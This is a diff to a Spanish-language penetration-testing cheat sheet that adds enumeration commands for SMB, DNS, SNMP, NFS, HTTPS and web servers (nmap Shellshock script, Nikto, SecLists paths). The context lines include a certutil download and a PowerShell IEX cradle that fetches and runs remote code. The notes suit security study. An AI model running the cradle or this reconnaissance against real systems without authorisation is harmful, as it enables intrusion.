@@ -5,7 +5,7 @@ tags: [CheetSheat]
 description: "Enumeración - CheetSheat"
 ---
 
-## Samba Port(445)
+## Samba Port 445
 
 ### Iniciar samba
 
@@ -62,7 +62,7 @@ nmap --script=smb-enum-shares,smb-enum-users -p445 <ip>
 
 ----
 
-## DNS (port 53)
+## DNS 53
 
 | argumento | descripción                     |
 |-----------|---------------------------------|
@@ -80,6 +80,40 @@ dig @<ip> <domain> mx
 
 ```
 dig @<ip> <domain> axfr
+```
+
+----
+
+## HTTPS 443
+
+```
+openssl s_client --connect <ip>:<port>
+```
+
+## SNMP UDP 161
+
+### Script de nmap
+
+```
+nmap --script snmp\* -p161 -sU <ip> -oN <output>
+```
+
+----
+
+## NFS 2049
+
+Es un sistema cliente / servidor que permite a los usuarios acceder a archivos a través de una red y tratarlos como si residieran en un directorio de archivos local.
+
+### Carpeta desponible
+
+```
+showmount -e <ip>
+```
+
+### Montar carpeta
+
+```
+sudo mount -t nfs <ip>:<remote_folder> <local_folder>
 ```
 
 ----
@@ -118,4 +152,38 @@ certutil.exe -f -urlcache -split <url>
 
 ```
 powershell IEX(New-Object Net.WebClient).downloadString('<url>')"
+```
+
+----
+
+## Diccionarios
+
+### Extensiones
+
+```
+> for i in $(locate extension | grep "word");do echo $(wc -l $i); done
+/usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
+```
+
+### CGI
+
+```
+/usr/share/wordlist/SecLists/Discovery/Web-Content/CGIs.txt
+```
+
+----
+
+### Shellshock
+
+```
+ls -lah /usr/share/nmap/scripts/*shellshock*
+nmap <ip> -p <port> --script=http-shellshock --script-args uri=/cgi-bin/<file>.cgi --script-args uri=/cgi-bin/<file2>.cgi
+```
+
+----
+
+## Nikto
+
+```
+nikto -host <ip>
 ```
